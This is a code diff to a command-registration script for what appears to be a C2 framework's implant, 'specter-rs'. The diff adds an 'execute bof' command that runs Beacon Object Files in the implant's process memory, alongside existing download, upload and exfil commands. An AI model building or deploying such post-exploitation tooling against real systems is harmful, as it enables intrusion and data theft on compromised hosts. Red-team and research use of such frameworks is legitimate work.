@@ -59,6 +59,13 @@ function RegisterCommands(listenerType)
     let cmd_exfil = ax.create_command("exfil", "Manage current downloads");
     cmd_exfil.addSubCommands([_cmd_exfil_start, _cmd_exfil_stop, _cmd_exfil_cancel]);
 
+    let _cmd_execute_bof = ax.create_command("bof", "Execute Beacon Object File", "execute bof /home/user/whoami.o", "Task: execute BOF");
+    _cmd_execute_bof.addArgBool("-a", "Async mode");
+    _cmd_execute_bof.addArgFile("bof", true, "Path to object file");
+    _cmd_execute_bof.addArgString("param_data", false);
+    let cmd_execute = ax.create_command("execute", "Execute [bof] in the current process's memory");
+    cmd_execute.addSubCommands([_cmd_execute_bof]);
+
     let cmd_sleep = ax.create_command("sleep", "Sets sleep time", "sleep 30m5s 10", "Task: sleep");
     cmd_sleep.addArgString("sleep", true, "Time in '%h%m%s' format or number of seconds");
     cmd_sleep.addArgInt("jitter", false, "Max random amount of time in % added to sleep");
@@ -69,7 +76,7 @@ function RegisterCommands(listenerType)
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_ps, cmd_download, cmd_upload, cmd_exfil, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_ps, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
         return { commands_windows: commands_http }
     }
 
@@ -95,7 +102,7 @@ function GenerateUI(listeners_type)
     let dateKill = form.create_dateline("dd.MM.yyyy");
     let timeKill = form.create_timeline("HH:mm:ss");
 
-    let checkDebug = form.create_check("Debug (phase 3)");
+    let checkDebug = form.create_check("Debug (specter.log next to the implant)");
 
     let layout = form.create_gridlayout();
     layout.addWidget(labelFormat,   0, 0, 1, 1);
